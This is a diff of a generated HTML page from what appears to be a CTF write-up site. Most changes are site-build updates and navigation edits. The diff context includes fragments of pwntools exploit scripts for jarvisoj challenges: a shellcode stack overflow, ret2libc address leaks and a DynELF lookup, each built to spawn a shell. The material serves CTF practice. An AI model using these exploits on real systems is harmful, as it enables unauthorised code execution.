@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.3">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
     
     
       
@@ -46,7 +46,7 @@
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/application.4031d38b.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.82a18eb7.css">
       
         <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.3e3d1dff.css">
       
@@ -62,7 +62,7 @@
     
       
         <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
-        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Fira+Sans:300,400,400i,700|Fira+Mono&display=fallback">
+        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Fira+Sans:300,400,400i,700%7CFira+Mono&display=fallback">
         <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
       
     
@@ -2369,18 +2369,6 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../reverse/basic (SFConflict wzcboss@qq.com 2019-10-16-12-03-27)/" title="basic (SFConflict wzcboss@qq.com 2019 10 16 12 03 27)" class="md-nav__link">
-      basic (SFConflict wzcboss@qq.com 2019 10 16 12 03 27)
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
     <a href="../../../reverse/basic/" title="Basic" class="md-nav__link">
       Basic
     </a>
@@ -2550,13 +2538,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-17" type="checkbox" id="nav-8-17">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-16" type="checkbox" id="nav-8-16">
     
-    <label class="md-nav__link" for="nav-8-17">
+    <label class="md-nav__link" for="nav-8-16">
       010editor
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-8-17">
+      <label class="md-nav__title" for="nav-8-16">
         010editor
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -2611,6 +2599,18 @@
   <li class="md-nav__item">
     <a href="../../../ustc/857/" title="857" class="md-nav__link">
       857
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../ustc/math/" title="Math" class="md-nav__link">
+      Math
     </a>
   </li>
 
@@ -2754,8 +2754,8 @@ exp:</p>
 <div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn2.jarvisoj.com&#39;</span><span class="p">,</span><span class="mi">9877</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
-<span class="n">buf_addr</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span><span class="o">=</span><span class="bp">False</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">buf_addr</span>
+<span class="n">buf_addr</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span><span class="o">=</span><span class="kc">False</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">buf_addr</span>
 <span class="n">shellcode</span><span class="o">=</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="o">+</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x8c</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">))</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
@@ -2766,7 +2766,7 @@ exp:</p>
 <span class="kn">import</span> <span class="nn">binascii</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 <span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;bash&#39;</span><span class="p">]</span>
-<span class="n">debug</span><span class="o">=</span><span class="bp">False</span>
+<span class="n">debug</span><span class="o">=</span><span class="kc">False</span>
 
 <span class="n">libc</span><span class="o">=</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>
 <span class="n">elf_name</span><span class="o">=</span><span class="s1">&#39;./level2&#39;</span>
@@ -2800,7 +2800,7 @@ exp:</p>
 <span class="kn">import</span> <span class="nn">binascii</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 <span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;bash&#39;</span><span class="p">]</span>
-<span class="n">debug</span><span class="o">=</span><span class="bp">False</span>
+<span class="n">debug</span><span class="o">=</span><span class="kc">False</span>
 
 <span class="n">libc</span><span class="o">=</span><span class="s1">&#39;./libc-2.19.so&#39;</span>
 <span class="c1"># libc=&#39;/lib32/libc.so.6&#39;</span>
@@ -2831,7 +2831,7 @@ exp:</p>
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
 <span class="n">temp</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
-<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
 <span class="n">libc_base</span><span class="o">=</span><span class="n">temp</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
 <span class="n">system_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
 <span class="n">bin_sh_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
@@ -2852,7 +2852,7 @@ exp:</p>
 <span class="kn">import</span> <span class="nn">binascii</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 <span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;bash&#39;</span><span class="p">]</span>
-<span class="n">debug</span><span class="o">=</span><span class="bp">False</span>
+<span class="n">debug</span><span class="o">=</span><span class="kc">False</span>
 <span class="n">libc</span><span class="o">=</span><span class="s1">&#39;./libc-2.19.so&#39;</span>
 <span class="n">libc</span><span class="o">=</span><span class="s1">&#39;/lib32/libc.so.6&#39;</span>
 <span class="n">elf_name</span><span class="o">=</span><span class="s1">&#39;./level4&#39;</span>
@@ -2886,13 +2886,13 @@ exp:</p>
         <span class="mi">4</span>
     <span class="p">])</span>
     <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-    <span class="k">print</span> <span class="s2">&quot;</span><span class="si">%#x</span><span class="s2"> </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="s2">&quot;</span><span class="si">%#x</span><span class="s2"> </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
 
 
 <span class="n">dynelf</span><span class="o">=</span><span class="n">DynELF</span><span class="p">(</span><span class="n">lake</span><span class="p">,</span><span class="n">elf</span><span class="o">=</span><span class="n">elf</span><span class="p">)</span>
 <span class="n">system_addr</span><span class="o">=</span><span class="n">dynelf</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span><span class="s1">&#39;libc&#39;</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">system_addr</span>
+<span class="nb">print</span> <span class="n">system_addr</span>
 <span class="c1">## get shell</span>
 <span class="n">read_bin_sh</span><span class="o">=</span><span class="n">flat</span><span class="p">([</span>
     <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">,</span>
@@ -2922,6 +2922,7 @@ exp:</p>
 </pre></div></p>
                 
                   
+                
                 
               
               
@@ -3018,7 +3019,7 @@ exp:</p>
       
     </div>
     
-      <script src="../../../assets/javascripts/application.718059d6.js"></script>
+      <script src="../../../assets/javascripts/application.d151b584.js"></script>
       
         
         
